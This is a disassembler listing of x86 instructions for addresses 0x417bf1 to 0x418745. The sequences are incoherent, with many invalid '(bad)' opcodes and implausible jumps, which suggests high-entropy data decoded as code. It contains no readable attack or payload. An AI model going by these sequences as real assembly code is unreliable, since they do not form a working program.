  417bf1:	mov    ss,WORD PTR [ecx-0x7615d675]
  417bf7:	js     0x417c0c
  417bf9:	imul   esp,DWORD PTR [eax],0x6d482fbe
  417bff:	or     eax,0xd2041174
  417c04:	mov    bh,0xec
  417c06:	cmp    al,0x4f
  417c08:	popa   
  417c09:	jb     0x417c4b
  417c0b:	enter  0x6e91,0x82
  417c0f:	adc    esp,ebp
  417c11:	data16 and al,0x88
  417c14:	cmp    al,0xf8
  417c16:	push   es
  417c17:	jae    0x417c98
  417c19:	pop    ss
  417c1a:	ret    0xb03c
  417c1d:	aad    0x75
  417c1f:	and    edx,edx
  417c21:	xchg   ebp,eax
  417c22:	xchg   esp,eax
  417c23:	pop    ecx
  417c24:	(bad)  
  417c25:	mov    ss:0x46f6bd0a,eax
  417c2b:	nop
  417c2c:	daa    
  417c2d:	xchg   ebp,eax
  417c2e:	cmp    BYTE PTR [eax+0x4e91705d],0x5d
  417c35:	(bad)  
  417c36:	out    0x47,eax
  417c38:	pcmpeqw mm1,QWORD PTR [ebp-0x6]
  417c3c:	and    eax,0x6bba5a5e
	...
  417cb1:	add    BYTE PTR [eax],al
  417cb3:	add    BYTE PTR [ecx],ah
  417cb5:	xchg   ebx,eax
  417cb6:	mov    DWORD PTR [edi-0x60d84045],ebp
  417cbc:	(bad)  
  417cbd:	jle    0x417d17
  417cbf:	sbb    eax,ecx
  417cc1:	jb     0x417d3b
  417cc3:	popa   
  417cc4:	aaa    
  417cc5:	add    eax,DWORD PTR [ecx]
  417cc7:	add    ch,dh
  417cc9:	add    BYTE PTR [eax],al
  417ccb:	add    bl,ch
  417ccd:	jmp    0x417cfd
  417ccf:	shl    dh,0x84
  417cd2:	mov    bl,BYTE PTR [eax+0x4cc45544]
  417cd8:	xchg   ebx,eax
  417cd9:	ds stos BYTE PTR es:[edi],al
  417cdb:	cmc    
  417cdc:	xchg   edi,eax
  417cdd:	mov    dh,0x46
  417cdf:	scas   eax,DWORD PTR es:[edi]
  417ce0:	inc    esi
  417ce1:	out    dx,al
  417ce2:	stos   BYTE PTR es:[edi],al
  417ce3:	imul   ebp,DWORD PTR [edi+0x15],0xa247ad78
  417cea:	rcr    DWORD PTR [ebx],1
  417cec:	pop    ebp
  417ced:	je     0x417c7e
  417cef:	jmp    0x963ef679
  417cf4:	fcmovbe st,st(3)
  417cf6:	iret   
  417cf7:	ror    BYTE PTR ds:0x65e4b572,0x84
  417cfe:	fnstcw WORD PTR [esi]
  417d00:	dec    ecx
  417d01:	outs   dx,BYTE PTR ds:[esi]
  417d02:	daa    
  417d03:	sbb    eax,0x918378ac
  417d08:	int3   
  417d09:	cs inc esi
  417d0b:	loopne 0x417cd2
  417d0d:	mov    ah,0x64
  417d0f:	in     eax,dx
  417d10:	fwait
  417d11:	scas   al,BYTE PTR es:[edi]
  417d12:	and    ch,dl
  417d14:	xchg   esp,eax
  417d15:	test   eax,0x3345eb10
  417d1a:	(bad)  
  417d1b:	test   eax,0xe490353b
  417d20:	aad    0x2
  417d22:	jno    0x417cfc
  417d24:	fwait
  417d25:	retf   
  417d26:	(bad)  
  417d27:	dec    esp
  417d28:	xchg   ecx,eax
  417d29:	inc    eax
  417d2a:	jp     0x417ce3
  417d2c:	xchg   ecx,eax
  417d2d:	leave  
  417d2e:	cmc    
  417d2f:	add    al,0x8b
  417d31:	aaa    
  417d32:	clc    
  417d33:	es inc edx
  417d35:	ds out 0xe9,eax
  417d38:	ja     0x417d99
  417d3a:	jns    0x417db0
  417d3c:	cmc    
  417d3d:	push   ds
  417d3e:	push   ss
  417d3f:	clc    
  417d40:	es inc edx
  417d42:	test   eax,0xacc7a68e
  417d47:	test   DWORD PTR [eax],edx
  417d49:	add    ebx,DWORD PTR [edx-0xdf9aaf1]
  417d4f:	jle    0x417d27
  417d51:	scas   eax,DWORD PTR es:[edi]
  417d52:	sub    bl,BYTE PTR [ebx]
  417d54:	in     eax,0xcc
  417d56:	sbb    al,BYTE PTR ds:[ecx+ecx*4]
  417d5a:	std    
  417d5b:	xor    dl,bh
  417d5d:	mov    dh,0x42
  417d5f:	gs sar bh,1
  417d62:	mov    WORD PTR [edx-0x26],fs
  417d65:	mov    esi,0x21be647
  417d6a:	sbb    al,0xde
  417d6c:	mov    ecx,0xfacb9b6e
  417d71:	pop    edi
  417d72:	add    eax,DWORD PTR [ecx-0x6f]
  417d75:	jge    0x417d33
  417d77:	xor    ebx,DWORD PTR [edx+esi*1+0x282be657]
  417d7e:	jns    0x417de1
  417d80:	push   cs
  417d81:	sti    
  417d82:	imul   dh
  417d84:	xchg   ecx,eax
  417d85:	(bad)  
  417d86:	icebp  
  417d87:	lahf   
  417d88:	into   
  417d89:	push   ss
  417d8a:	ja     0x417e00
  417d8c:	cmp    al,dh
  417d8e:	and    al,0x37
  417d90:	out    0xd4,eax
  417d92:	push   0x2a
  417d94:	push   eax
  417d95:	mov    edx,0xa4d915a0
  417d9a:	and    BYTE PTR [ebp+0x1752cd43],bl
  417da0:	out    dx,eax
  417da1:	adc    esp,DWORD PTR [esi-0x48ff97fd]
  417da7:	cli    
  417da8:	lock (bad) 
  417daa:	dec    edi
  417dab:	adc    al,0x7f
  417dad:	scas   eax,DWORD PTR es:[edi]
  417dae:	out    0xc0,al
  417db0:	outs   dx,DWORD PTR ds:[esi]
  417db1:	inc    esi
  417db2:	ds sub eax,0x3cd1ae03
  417db8:	or     eax,0x17e44c56
  417dbd:	test   BYTE PTR [edx+0x2d],0xd0
	...
  417e31:	add    BYTE PTR [eax],al
  417e33:	add    BYTE PTR [edi-0x519271e7],bh
  417e39:	(bad)  
  417e3a:	(bad)  
  417e3b:	(bad)  
  417e3d:	xlat   BYTE PTR ds:[ebx]
  417e3e:	aam    0xef
  417e40:	rcl    BYTE PTR [ebx-0x1a],0x84
  417e44:	sub    al,0x4
  417e46:	add    DWORD PTR [eax],eax
  417e48:	cmc    
  417e49:	add    BYTE PTR [eax],al
  417e4b:	add    BYTE PTR [esi+0x7f],cl
  417e4e:	add    al,BYTE PTR [edi+0x59]
  417e51:	mov    edi,DWORD PTR ds:0x853cc2f3
  417e57:	cdq    
  417e58:	dec    ebx
  417e59:	jno    0x417e1f
  417e5b:	es inc edi
  417e5d:	bound  ebx,QWORD PTR [edx]
  417e5f:	jmp    0x48dc15ae
  417e64:	inc    esp
  417e65:	repnz xor cl,bh
  417e68:	adc    eax,0x6442477b
  417e6d:	dec    esi
  417e6e:	repnz pushf 
  417e70:	gs or  edx,edx
  417e73:	push   0x276f417f
  417e78:	imul   ebx,DWORD PTR [eax+0x48],0xffffffdd
  417e7c:	popf   
  417e7d:	test   eax,0x77d3d356
  417e82:	ds inc edx
  417e84:	mov    eax,0x7383e3a9
  417e89:	xchg   ebx,eax
  417e8a:	stos   BYTE PTR es:[edi],al
  417e8b:	push   ebp
  417e8c:	fmul   st(2),st
  417e8e:	jl     0x417e3d
  417e90:	(bad)
  417e93:	lods   eax,DWORD PTR ds:[esi]
  417e94:	sub    eax,esp
  417e96:	shr    BYTE PTR [edi-0x57],0xb5
  417e9a:	pusha  
  417e9b:	stos   DWORD PTR es:[edi],eax
  417e9c:	xor    DWORD PTR [ecx+0x7c],ecx
  417e9f:	sbb    ah,BYTE PTR [ebp+0x6502cdf4]
  417ea5:	mov    esp,0xd32bf650
  417eaa:	jecxz  0x417e78
  417eac:	jo     0x417eda
  417eae:	leave  
  417eaf:	cmp    BYTE PTR [esi],ah
  417eb1:	rol    BYTE PTR [ecx+ebp*2],cl
  417eb4:	lods   eax,DWORD PTR ds:[esi]
  417eb5:	mov    al,ds:0xc33c576e
  417eba:	pop    ebx
  417ebb:	cmp    esp,DWORD PTR [esi+0x22e08f7]
  417ec1:	add    dl,cl
  417ec3:	fldenv ds:0xf5acd61c
  417ec9:	fmul   DWORD PTR [edx+0x44]
  417ecc:	sub    dh,0xab
  417ecf:	int3   
  417ed0:	pop    ebx
  417ed1:	ja     0x417f41
  417ed3:	push   esi
  417ed4:	lahf   
  417ed5:	in     eax,dx
  417ed6:	mov    ds:0x44406615,al
  417edb:	jmp    0xf65696bc
  417ee0:	(bad)  
  417ee1:	pop    ebx
  417ee2:	mov    WORD PTR [esi],cs
  417ee4:	mov    esi,0x12771897
  417ee9:	pop    edx
  417eea:	inc    edx
  417eeb:	sbb    DWORD PTR [ecx+eiz*4+0x24],0x4e9ee0ee
  417ef3:	sub    ebp,DWORD PTR [esi-0x42]
  417ef6:	or     bl,BYTE PTR [ebx-0x10]
  417ef9:	inc    edx
  417efa:	cdq    
  417efb:	push   esi
  417efc:	and    DWORD PTR [edx],esi
  417efe:	ret    0x65b6
  417f01:	and    BYTE PTR [edx+0x50],dl
  417f04:	push   edx
  417f05:	pop    ebp
  417f06:	pop    ebx
  417f07:	push   es
  417f08:	sar    bh,0xc1
  417f0b:	cmp    al,0xb6
  417f0d:	mov    ecx,DWORD PTR [esi-0x32]
  417f10:	aaa    
  417f11:	stos   BYTE PTR es:[edi],al
  417f12:	call   0xbac17efb
  417f17:	retf   
  417f18:	cmp    DWORD PTR [edx-0x24],ebx
  417f1b:	ja     0x417f9c
  417f1d:	jmp    FWORD PTR ds:0x47c333ae
  417f23:	mov    bh,BYTE PTR [ebx]
  417f25:	mov    edx,ebx
  417f27:	out    0x94,eax
  417f29:	sub    ebx,DWORD PTR [ebx-0x219c51ef]
  417f2f:	mov    al,ds:0xe155f24b
  417f34:	jmp    0x92f8:0xee7a14e7
  417f3b:	push   0xffffffcd
  417f3d:	inc    edx
  417f3e:	cdq    
  417f3f:	cmp    ebx,DWORD PTR [eax]
	...
  417fb1:	add    BYTE PTR [eax],al
  417fb3:	add    BYTE PTR [esi+0x2d],dh
  417fb6:	push   ebp
  417fb7:	inc    ecx
  417fb8:	pop    edi
  417fb9:	jns    0x418031
  417fbb:	aas    
  417fbc:	fisttp DWORD PTR [esi-0x68]
  417fbf:	inc    edx
  417fc0:	mov    dh,0xc7
  417fc2:	fdiv   DWORD PTR [edx+0x10521]
  417fc8:	cmc    
  417fc9:	add    BYTE PTR [eax],al
  417fcb:	add    BYTE PTR [edx-0x39],bl
  417fce:	fcomp  QWORD PTR [esi+0x350c2cf0]
  417fd4:	in     eax,dx
  417fd5:	push   ds
  417fd6:	aas    
  417fd7:	pop    ebp
  417fd8:	xor    ebp,DWORD PTR [edi]
  417fda:	dec    ebx
  417fdb:	dec    ebp
  417fdc:	jecxz  0x418030
  417fde:	jo     0x418010
  417fe0:	pusha  
  417fe1:	je     0x417fcf
  417fe3:	fdivr  QWORD PTR [ebx+0x1f8e42de]
  417fe9:	out    0x25,eax
  417feb:	sti    
  417fec:	aas    
  417fed:	and    edi,DWORD PTR [ebp-0x2b]
  417ff0:	pop    esi
  417ff1:	jmp    0x417ffa
  417ff3:	or     DWORD PTR [edi+0x55],esi
  417ff6:	xor    cl,ch
  417ff8:	push   ebp
  417ff9:	add    BYTE PTR [edi+edi*4],ah
  417ffc:	pop    edx
  417ffd:	or     eax,0xb5b16b80
  418002:	ficomp WORD PTR [ecx-0x4fd9044f]
  418008:	cli    
  418009:	jb     0x41806d
  41800b:	mov    ch,0x29
  41800d:	jmp    0x1922:0x4928b646
  418014:	jnp    0x417ff0
  418016:	xlat   BYTE PTR ds:[ebx]
  418017:	arpl   WORD PTR [ebp+ebx*8-0x1b3f010d],di
  41801e:	push   ebp
  41801f:	dec    edx
  418020:	(bad)
  418025:	outs   dx,BYTE PTR ds:[esi]
  418026:	popa   
  418027:	jmp    0x41806f
  418029:	lods   eax,DWORD PTR ds:[esi]
  41802a:	and    DWORD PTR [ebx],esp
  41802c:	or     dl,bh
  41802e:	bound  eax,QWORD PTR [ebx-0xab84ae1]
  418034:	(bad)  
  418035:	daa    
  418036:	pop    eax
  418037:	or     ecx,DWORD PTR [ecx]
  418039:	xor    eax,0x64636ca6
  41803e:	aaa    
  41803f:	das    
  418040:	push   ebp
  418041:	xchg   ecx,eax
  418042:	fwait
  418043:	cmp    al,0x71
  418045:	out    0xcc,al
  418047:	push   esi
  418048:	mov    dh,BYTE PTR [eax]
  41804a:	inc    edx
  41804b:	dec    ecx
  41804c:	fistp  WORD PTR ds:0x5313a838
  418052:	ftst   
  418054:	aas    
  418055:	int3   
  418056:	cmp    eax,0xae0e8487
  41805b:	call   FWORD PTR [ecx+eax*1-0x6bc68f1a]
  418062:	pop    ds
  418063:	call   0x684307b3
  418068:	inc    ebp
  418069:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41806a:	outs   dx,BYTE PTR ds:[esi]
  41806c:	add    ecx,esi
  41806e:	or     DWORD PTR [edi-0x205c4c3a],0x56e8d020
  418078:	pusha  
  418079:	push   es
  41807a:	mov    cl,0x2f
  41807c:	imul   BYTE PTR [esi+0x16]
  41807f:	int    0xc0
  418081:	jg     0x418083
  418083:	dec    eax
  418084:	dec    esp
  418085:	jg     0x4180e4
  418087:	mov    edx,0xf966e74d
  41808c:	push   0x12
  41808e:	jo     0x4180fd
  418090:	dec    edi
  418091:	in     al,dx
  418092:	(bad)  
  418093:	mov    ds:0xbdd6b16b,eax
  418098:	retf   
  418099:	inc    BYTE PTR [edi-0x322ff4c5]
  41809f:	mov    dh,0x1d
  4180a1:	loopne 0x41803d
  4180a3:	adc    esi,DWORD PTR [esi]
  4180a5:	es pop ebp
  4180a7:	jge    0x4180d8
  4180a9:	cmp    al,0x5e
  4180ab:	push   ebp
  4180ad:	add    bh,BYTE PTR [eax]
  4180af:	cmc    
  4180b0:	mov    ebx,0x797d044e
  4180b5:	fcomp  DWORD PTR [eax-0x75]
  4180b8:	add    dl,0xe5
  4180bb:	push   es
  4180bc:	ror    DWORD PTR [eax+0x67],0x93
  4180c0:	fiadd  DWORD PTR [eax]
	...
  418132:	add    BYTE PTR [eax],al
  418134:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418135:	sbb    DWORD PTR [eax+0x1a],esi
  418138:	(bad)  
  418139:	jnp    0x418129
  41813b:	mov    ebp,0xe8ea9e45
  418140:	imul   esp,ecx,0x6
  418143:	xor    BYTE PTR [esi],dl
  418145:	push   es
  418146:	add    DWORD PTR [eax],eax
  418148:	cmc    
  418149:	add    BYTE PTR [eax],al
  41814b:	add    BYTE PTR [ebx],bh
  41814d:	inc    ebx
  41814e:	jae    0x418130
  418150:	add    al,0x9d
  418152:	into   
  418153:	add    BYTE PTR [ecx+ebx*1],0x74
  418157:	mov    ah,0x4e
  418159:	cmp    BYTE PTR [ecx+edx*4+0x7ca4734e],bl
  418160:	add    edx,esi
  418162:	and    al,BYTE PTR [eax-0x2dcf0b3c]
  418168:	push   ebx
  418169:	mov    ch,0x71
  41816b:	sub    al,0x6b
  41816d:	fwait
  41816e:	inc    edi
  41816f:	ret    
  418170:	int3   
  418171:	pop    es
  418172:	xor    eax,0x39968722
  418177:	cmc    
  418178:	xlat   BYTE PTR ds:[ebx]
  418179:	mov    eax,0x173edc8c
  41817e:	xchg   ebx,eax
  41817f:	(bad)  
  418181:	mov    eax,0x5ce90b98
  418186:	je     0x418156
  418188:	out    dx,al
  418189:	mov    WORD PTR ds:0xc4edb57c,es
  41818f:	jb     0x418190
  418191:	scas   eax,DWORD PTR es:[edi]
  418192:	inc    edx
  418193:	stc    
  418194:	push   es
  418195:	nop
  418196:	daa    
  418197:	les    esp,FWORD PTR [ebx+ecx*4]
  41819a:	mov    WORD PTR [esi+0xe],ds
  41819d:	lock push ecx
  41819f:	pop    eax
  4181a0:	scas   al,BYTE PTR es:[edi]
  4181a1:	(bad)  
  4181a3:	inc    esi
  4181a4:	mov    ah,0x72
  4181a6:	int3   
  4181a7:	inc    edx
  4181a8:	mov    bh,0xf2
  4181aa:	cmp    edi,DWORD PTR [eax-0x49]
  4181ad:	out    dx,eax
  4181ae:	xchg   ecx,eax
  4181af:	mov    esi,eax
  4181b1:	cdq    
  4181b2:	test   DWORD PTR [edi-0x73530d81],ebx
  4181b8:	adc    dl,BYTE PTR [ebp+0x4f692d3f]
  4181be:	mov    bh,BYTE PTR [ebp+0x2f]
  4181c1:	cwde   
  4181c2:	in     al,0x80
  4181c4:	mov    edi,0xb6f43736
  4181c9:	push   esi
  4181cb:	sub    bh,BYTE PTR [edx-0x64c6978f]
  4181d1:	push   ebp
  4181d2:	xchg   ebp,eax
  4181d3:	fs je  0x418189
  4181d6:	push   cs
  4181d7:	jnp    0x418212
  4181d9:	(bad)  
  4181da:	jb     0x4181ba
  4181dc:	jge    0x418242
  4181de:	fidiv  DWORD PTR [eax-0x69263a48]
  4181e4:	sub    bh,BYTE PTR [eax]
  4181e6:	and    eax,0x353a4d57
  4181eb:	into   
  4181ec:	cdq    
  4181ed:	xchg   edi,eax
  4181ee:	fiadd  DWORD PTR [edx+0x5d]
  4181f1:	mov    ebx,0xc78cc539
  4181f6:	inc    ebp
  4181f7:	test   BYTE PTR [ebp+0x3d970b11],dh
  4181fd:	punpckldq mm5,DWORD PTR [ebx+0xe]
  418201:	jp     0x418219
  418203:	loopne 0x41827a
  418205:	cmp    BYTE PTR [ebx+esi*1-0x57135300],0x84
  41820d:	push   ds
  41820e:	pusha  
  41820f:	dec    ebx
  418210:	mov    WORD PTR [ebp+0x76e0d2df],ds
  418216:	cdq    
  418217:	mov    ds:0xc10a79b0,eax
  41821c:	jmp    0x4181bc
  41821e:	jae    0x4181a6
  418220:	scas   eax,DWORD PTR es:[edi]
  418221:	sbb    dh,BYTE PTR [edi+0x48]
  418224:	setns  BYTE PTR [esi+0x8c2556a]
  41822b:	or     edi,DWORD PTR [eax]
  41822d:	push   eax
  41822e:	inc    edi
  41822f:	in     eax,dx
  418230:	shl    ebp,0xe5
  418233:	push   eax
  418234:	jb     0x4181f4
  418236:	les    edx,FWORD PTR [edi-0x3faa6615]
  41823c:	fnstsw WORD PTR [edi-0x30]
  41823f:	lods   al,BYTE PTR ds:[esi]
  418240:	icebp  
	...
  4182b1:	add    BYTE PTR [eax],al
  4182b3:	add    BYTE PTR [ecx-0x44],ch
  4182b6:	xlat   BYTE PTR ds:[ebx]
  4182b7:	pop    esi
  4182b8:	xlat   BYTE PTR ds:[ebx]
  4182b9:	jg     0x4182a4
  4182bb:	mov    edi,0x113ef3ec
  4182c0:	jmp    0x4182c4
  4182c2:	pop    ss
  4182c3:	push   ebx
  4182c4:	or     eax,DWORD PTR [edi]
  4182c6:	add    DWORD PTR [eax],eax
  4182c8:	cmc    
  4182c9:	add    BYTE PTR [eax],al
  4182cb:	add    ah,dl
  4182cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182ce:	jnp    0x4182d6
  4182d0:	xchg   esp,eax
  4182d1:	scas   eax,DWORD PTR es:[edi]
  4182d2:	std    
  4182d3:	gs mov bl,0x1
  4182d6:	add    edx,DWORD PTR [esi+0x432688c]
  4182dc:	mov    dh,0xba
  4182de:	repnz pop edi
  4182e0:	les    ebp,FWORD PTR [edi]
  4182e2:	jecxz  0x4182cf
  4182e4:	clc    
  4182e5:	icebp  
  4182e6:	add    al,0x5b
  4182e8:	adc    edi,DWORD PTR [ecx]
  4182ea:	push   edx
  4182eb:	add    bh,ah
  4182ed:	mov    edi,0x50ecefa1
  4182f2:	sbb    al,0x3d
  4182f4:	inc    ebp
  4182f5:	xchg   DWORD PTR [edx+0x22],edi
  4182f8:	jp     0x4182ca
  4182fa:	fcmovbe st,st(5)
  4182fc:	(bad)  
  4182fd:	cmp    al,0x8d
  4182ff:	outs   dx,BYTE PTR ds:[esi]
  418300:	or     ebx,DWORD PTR [edx]
  418302:	xchg   ebp,eax
  418303:	adc    al,0x94
  418305:	add    ebx,DWORD PTR [edi]
  418307:	iret   
  418308:	imul   eax,DWORD PTR [ecx],0xa329b00c
  41830e:	add    DWORD PTR [eax-0xf],eax
  418311:	add    ch,0x65
  418314:	mov    ebp,0x7d4d697e
  418319:	lock mov DWORD PTR [esi-0x723b9fcc],edx
  418320:	ins    BYTE PTR es:[edi],dx
  418321:	sbb    BYTE PTR [edi],bl
  418323:	cmp    BYTE PTR [ebp-0x2c050269],0xc8
  41832a:	or     eax,0xfee0e916
  41832f:	cmp    eax,0x7c9384fb
  418334:	fist   DWORD PTR [esi-0xc1f5ff8]
  41833a:	dec    esp
  41833b:	dec    DWORD PTR [eax-0x3f]
  41833e:	ja     0x4182d8
  418340:	dec    eax
  418341:	mov    al,0xea
  418343:	in     eax,0x4e
  418345:	in     eax,dx
  418346:	fnstenv [eax]
  418348:	div    BYTE PTR [eax+0x442b49a7]
  41834e:	fwait
  41834f:	sub    eax,0x8990cacc
  418354:	xchg   ebx,eax
  418355:	stc    
  418356:	mov    eax,0xe335d9ad
  41835b:	imul   eax,DWORD PTR [eax+0x34fd1d49],0x3c
  418362:	loope  0x4182f2
  418364:	jo     0x41835f
  418366:	call   0x6f4101e3
  41836b:	or     eax,0xc1783a28
  418370:	daa    
  418371:	dec    esp
  418372:	mov    ch,0x97
  418374:	imul   ebx,DWORD PTR [eax+ecx*8],0x2133d9a5
  41837b:	stc    
  41837c:	test   BYTE PTR [edi+ebx*8-0x53],ah
  418380:	xor    ecx,DWORD PTR [eax]
  418382:	js     0x418305
  418384:	cmp    ebp,DWORD PTR [edx+eax*1-0x6e6f5e92]
  41838b:	mov    ecx,0x5c1b04b
  418390:	dec    edi
  418391:	mov    dl,0x6
  418393:	cmp    ecx,edi
  418395:	in     eax,0x88
  418397:	mov    ecx,0x6930f143
  41839c:	jne    0x41833e
  41839e:	fisttp QWORD PTR [esi]
  4183a0:	mov    bh,0x2d
  4183a2:	enter  0xeb4e,0xa4
  4183a6:	dec    edi
  4183a7:	aaa    
  4183a8:	bnd js 0x41834a
  4183ab:	dec    eax
  4183ac:	pushf  
  4183ad:	fstp   DWORD PTR [edi-0x61]
  4183b0:	dec    ecx
  4183b1:	lods   eax,DWORD PTR ds:[esi]
  4183b2:	mov    BYTE PTR [edx-0x35709897],ch
  4183b8:	or     BYTE PTR [edx-0x2c4fca49],ah
  4183be:	mov    edi,0xf822
	...
  418433:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  418439:	fdivr  st(7),st
  41843b:	mov    edi,0xdccd8f2d
  418440:	pop    edi
  418441:	sbb    DWORD PTR [ecx+edx*1],ebx
  418444:	add    BYTE PTR [eax],cl
  418446:	add    DWORD PTR [eax],eax
  418448:	cmc    
  418449:	add    BYTE PTR [eax],al
  41844b:	add    ch,dh
  41844d:	aam    0x92
  41844f:	and    bh,bl
  418451:	cmp    ebp,DWORD PTR [ecx-0x4214c3e]
  418457:	dec    eax
  418458:	or     DWORD PTR [eax*4-0x65d4ad29],eax
  41845f:	jae    0x4184dc
  418461:	cli    
  418462:	pop    ss
  418463:	mov    ds:0xa2c267d5,eax
  418468:	mov    eax,ds:0xbb14de79
  41846d:	adc    edx,DWORD PTR [ebx+0x544b43be]
  418473:	cmp    bh,BYTE PTR [ecx-0x2a]
  418476:	adc    ecx,DWORD PTR [edx+0x303b349b]
  41847c:	out    0x1b,al
  41847e:	adc    dh,dh
  418480:	xor    al,0xf3
  418482:	xor    eax,0xcd84261f
  418487:	or     ch,dh
  418489:	(bad)  
  41848a:	mov    bl,0xa3
  41848c:	in     al,dx
  41848d:	clc    
  41848e:	cmp    ecx,edx
  418490:	inc    edi
  418491:	call   0x1616972d
  418496:	pop    ecx
  418497:	loope  0x418449
  418499:	inc    ecx
  41849a:	repz retf 
  41849c:	inc    ebx
  41849d:	fs push eax
  41849f:	or     eax,0xa7cf96ba
  4184a4:	push   ds
  4184a5:	stos   DWORD PTR es:[edi],eax
  4184a6:	call   0x9d6a:0xe77d9a60
  4184ad:	add    BYTE PTR [esi-0xbbdb70f],ah
  4184b3:	or     bl,dl
  4184b5:	sar    al,cl
  4184b7:	mov    bh,0xc6
  4184b9:	shl    BYTE PTR [ebx+0x8],1
  4184bc:	mov    eax,ds:0xd4ea475a
  4184c1:	stos   BYTE PTR es:[edi],al
  4184c2:	out    dx,al
  4184c3:	push   ebp
  4184c4:	push   edi
  4184c5:	nop
  4184c6:	out    dx,al
  4184c7:	and    dh,BYTE PTR [eax+0x33]
  4184ca:	test   DWORD PTR [eax],0xb4ec5999
  4184d0:	push   ebp
  4184d1:	and    dh,0x84
  4184d4:	or     al,0x53
  4184d6:	fcomp  QWORD PTR [esi-0x41]
  4184d9:	push   0xffffff96
  4184db:	iret   
  4184dc:	push   0x39a265b5
  4184e1:	xor    esi,DWORD PTR [eax+0x7929fb1e]
  4184e7:	inc    eax
  4184e8:	sbb    eax,0xc38a04bb
  4184ed:	xor    ecx,DWORD PTR [ebp*8+0x1e27506d]
  4184f4:	mov    al,ds:0x777cfa34
  4184f9:	lods   eax,DWORD PTR ds:[esi]
  4184fa:	shl    DWORD PTR [ebp-0x3a],cl
  4184fd:	jmp    0x1035:0x4c0984b6
  418504:	xchg   esi,eax
  418505:	daa    
  418506:	test   BYTE PTR [eax],cl
  418508:	addr16 in eax,0xfa
  41850b:	stc    
  41850c:	jb     0x418577
  41850e:	lock xor DWORD PTR [edi-0x43],0x54
  418513:	cld    
  418514:	dec    ebx
  418515:	cwde   
  418516:	fsubr  QWORD PTR [eax-0x2d69a616]
  41851c:	push   edx
  41851d:	(bad)  
  41851f:	or     edi,DWORD PTR [ecx]
  418521:	lock loope 0x418588
  418524:	popa   
  418525:	xor    al,0x7d
  418527:	cmp    DWORD PTR [eax-0x3a],0x49
  41852b:	push   cs
  41852c:	jns    0x4184af
  41852e:	add    BYTE PTR [edx-0x79],cl
  418531:	adc    al,al
  418533:	or     eax,0x906f19f5
  418538:	jl     0x418513
  41853a:	inc    edx
  41853b:	daa    
  41853c:	test   eax,0x52ddf464
	...
  4185b1:	add    BYTE PTR [eax],al
  4185b3:	add    BYTE PTR [ecx-0x20b02c99],ch
  4185b9:	(bad)  
  4185ba:	mov    ebp,0x15c03be7
  4185bf:	stc    
  4185c0:	neg    DWORD PTR [esi+0x8f5e5f0]
  4185c6:	add    DWORD PTR [eax],eax
  4185c8:	cmc    
  4185c9:	add    BYTE PTR [eax],al
  4185cb:	add    dl,ah
  4185cd:	daa    
  4185ce:	hlt    
  4185cf:	das    
  4185d0:	test   eax,0x45c7c2b9
  4185d5:	ficom  DWORD PTR [ebx+0x40]
  4185d8:	(bad)  
  4185da:	fs pop edx
  4185dc:	test   BYTE PTR cs:[eax],al
  4185df:	adc    BYTE PTR [eax+0x59],cl
  4185e2:	fs lahf 
  4185e4:	xchg   ebp,eax
  4185e5:	scas   al,BYTE PTR es:[edi]
  4185e6:	(bad)  
  4185e7:	fs jge 0x4185fa
  4185ea:	ret    0x48a0
  4185ed:	aad    0x6c
  4185ef:	pop    edx
  4185f0:	sbb    ah,BYTE PTR [esi+0x5d]
  4185f3:	fwait
  4185f4:	mov    edi,0xd032acb9
  4185f9:	pop    ds
  4185fa:	add    eax,0x14abc4cc
  4185ff:	loopne 0x418663
  418601:	inc    edx
  418602:	loope  0x41866a
  418604:	mov    esp,0x466d25fe
  418609:	inc    ebx
  41860a:	dec    ebx
  41860b:	aas    
  41860c:	mov    ds:0x327a9ccb,al
  418611:	bound  ebx,QWORD PTR [edi+eiz*2]
  418614:	iret   
  418615:	inc    ecx
  418616:	imul   edx,DWORD PTR [edx],0xcf7ed787
  41861c:	in     eax,0xd6
  41861e:	mov    cl,0x64
  418620:	int    0x50
  418622:	shl    DWORD PTR [ecx-0x72fc8eb8],0x9c
  418629:	sub    DWORD PTR [esi],edi
  41862b:	inc    esp
  41862c:	and    BYTE PTR [edi],bh
  41862e:	mov    edi,0x628b9d92
  418633:	push   0xc65ef4df
  418638:	jle    0x4185da
  41863a:	daa    
  41863b:	xchg   ebx,eax
  41863c:	xchg   ecx,eax
  41863d:	mov    dl,0x6
  41863f:	fnstcw WORD PTR [eax]
  418641:	arpl   WORD PTR [esi+0x65a41d88],bp
  418647:	retf   0xc533
  41864a:	xchg   ebp,eax
  41864b:	loop   0x418655
  41864d:	inc    esp
  41864e:	shl    BYTE PTR [edi],1
  418650:	int    0x41
  418652:	mov    esp,0xe9e75a1e
  418657:	das    
  418658:	mov    ebp,0x4838665e
  41865d:	gs mov bh,0x22
  418660:	lods   al,BYTE PTR ds:[esi]
  418661:	fwait
  418662:	dec    ecx
  418663:	push   esi
  418664:	test   eax,0x94ab7f6d
  418669:	aam    0x9e
  41866b:	pop    esi
  41866c:	popa   
  41866d:	mov    ds:0x98ede11a,eax
  418672:	adc    BYTE PTR [eax+0xe],al
  418675:	xor    ah,al
  418677:	mov    ecx,0x54ea4c95
  41867c:	mov    bl,BYTE PTR es:[ebx-0x55]
  418680:	fadd   st(1),st
  418682:	adc    BYTE PTR [ecx+ebp*2],ah
  418685:	dec    eax
  418686:	mov    ds:0x39a80b95,eax
  41868b:	mov    ds,WORD PTR [ebp+0x6]
  41868e:	adc    DWORD PTR [eax+eiz*1],ecx
  418691:	mov    dl,0x6d
  418693:	aaa    
  418694:	sub    eax,0x5e1b49f9
  418699:	adc    eax,DWORD PTR [bx+di+0xc]
  41869d:	sbb    al,0x92
  41869f:	imul   esp,DWORD PTR [ebx-0x7a2186c6],0xffffffdc
  4186a6:	mov    al,ds:0xa5ee9db2
  4186ab:	mov    edi,0x115107e2
  4186b0:	inc    ebp
  4186b1:	xor    eax,0xe6879b35
  4186b6:	imul   ebp,esi,0xa13789c4
  4186bc:	xchg   esp,eax
  4186bd:	xor    al,0xbe
  4186bf:	daa    
  4186c0:	xchg   esp,eax
	...
  418731:	add    BYTE PTR [eax],al
  418733:	add    cl,ch
  418735:	push   cs
  418736:	(bad)  
  418737:	pop    ss
  418738:	push   edi
  41873a:	jmp    0xecc1a73d
  41873f:	sub    ebp,DWORD PTR [ebp+0x69]
  418742:	repz imul dl
  418745:	or     DWORD PTR [ecx],eax
